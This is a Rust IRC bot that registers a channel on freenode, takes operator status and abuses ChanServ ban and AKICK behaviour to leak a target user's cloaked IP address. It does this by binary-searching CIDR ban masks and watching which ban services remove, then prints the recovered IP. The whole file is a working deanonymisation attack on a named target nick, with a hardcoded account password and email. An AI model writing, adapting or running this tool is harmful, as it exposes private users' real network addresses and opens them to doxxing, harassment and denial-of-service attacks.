use std::net::TcpStream;
use std::net::Ipv4Addr;
use std::io::BufReader;
use std::io::BufRead;
use std::io::Write;
use std::time::Duration;
use std::str::FromStr;
use std::thread;

const NICK: &'static str = "john smith";
const HOST: &'static str = "irc.freenode.net";
const PORT: &'static str = "6667";
const DUCK: &'static str = "morpheus";
const USER: &'static str = "neo";
const GCOS: &'static str = "*Unknown*";
const CHAN: &'static str = "##ducktales";
const MAIL: &'static str = "ducktales@gmail.com";
const PASS: &'static str = "coolbeans";

const ERR_NICKNAMEINUSE: u32 = 433;
const ENDMOTD : u32 = 376;


fn irc_write(mut stream: &TcpStream, msg: &str) {
    thread::sleep(Duration::from_millis(1500));
    println!("{}", msg);
    let _ = stream.write_all(format!("{}\r\n", msg).as_bytes());
    let _ = stream.flush();
}

fn next_two(address: u32, shift: u8, stream: &TcpStream) {
    let mask = " *!*@";
    let mut modl = String::from(format!("MODE {} +bbbb", CHAN));

    let mut tries: [u32; 4] = [0; 4];
    for i in 0..4 {
        tries[i] = address | (i as u32) << shift;
    }

    let mut ipv4s = vec![];
    let mut octet: [u8; 4] = [0; 4];
    for i in 0..4 {
        for j in (0..4).rev() {
            octet[j] = ((tries[i] >> 8 * (3 - j)) & 0x000000FF) as u8;
        }
        ipv4s.push(Ipv4Addr::new(octet[0], octet[1], octet[2], octet[3]));
        modl.push_str(mask);
        modl.push_str(&ipv4s[i].to_string());
        modl.push_str(&format!("/{}", 32 - shift));
    }

    irc_write(&stream, &modl);
    irc_write(&stream, &format!("CS AKICK {} ADD {} !P", CHAN, DUCK));
    irc_write(&stream, &format!("CS AKICK {} DEL {}", CHAN, DUCK));
}

fn main() {
    let mut nick = String::from(NICK);

    let stream = match TcpStream::connect(&*format!("{}:{}", HOST, PORT)) {
        Ok(s) => {
            println!("[~] Connected to {}", HOST);
            s
        },
        Err(_) => {
            println!("[!] Connection to {} failed, exiting.", HOST);
            return ()
        }
    };

    irc_write(&stream, &format!("USER {} . . :{}", USER, GCOS));
    irc_write(&stream, &format!("NICK {}", nick));

    let mut aline = String::new();
    let mut reader = BufReader::new(&stream);

    while !aline.contains(&ENDMOTD.to_string()) {
        aline.clear();
        let _ = reader.read_line(&mut aline);
        println!("{}", aline.trim_right());

        if aline.contains(&ERR_NICKNAMEINUSE.to_string()) {
            println!("[!] Nick is in use, adding underscores.");
            nick.push('_');
            let _ = irc_write(&stream, &format!("NICK {}", nick));
        }
    }

    irc_write(&stream, &format!("NS REGISTER {} {}", PASS, MAIL));
    irc_write(&stream, &format!("NS ID {} {}", nick, PASS));
    thread::sleep(Duration::from_millis(2000));
    irc_write(&stream, &format!("JOIN {}", CHAN));
    irc_write(&stream, &format!("CS CLEAR {} BANS", CHAN));
    irc_write(&stream, &format!("USERHOST {}", DUCK));
    thread::sleep(Duration::from_millis(2000));
    irc_write(&stream, &format!("CS REGISTER {}", CHAN));
    irc_write(&stream, &format!("CS OP {} {}", CHAN, nick));
    irc_write(&stream, &format!("CS SET {} MLOCK OFF", CHAN));
    irc_write(&stream, &format!("MODE {} +nst", CHAN));
    thread::sleep(Duration::from_millis(2000));

    let mut address: u32 = 0;
    let mut shift = 30;
    next_two(address, shift, &stream);

    loop {
        aline.clear();
        let _ = reader.read_line(&mut aline);

        aline = String::from(aline.to_lowercase().trim_right());
        println!("{}", &aline);

        if aline.starts_with("ping") {
            irc_write(&stream, &format!("PONG {}", aline.split_whitespace().last().unwrap()));
        }
        else if aline.starts_with(":chanserv!") && aline.contains(&format!(" mode {} -b", CHAN)) {
            let astr = aline.split("*!*@").nth(1).unwrap().split("/").nth(0).unwrap();
            let octets = Ipv4Addr::from_str(astr).unwrap().octets();
            for i in 0..4 {
                address |= (octets[i] as u32) << 8 * (3-i);
            }
            if shift > 0 {
                shift -= 2;
                next_two(address, shift, &stream);
            }
            else {
                println!("\n>>> {} :: {} <<<", DUCK, astr);
                break;
            }
        }
    }
}
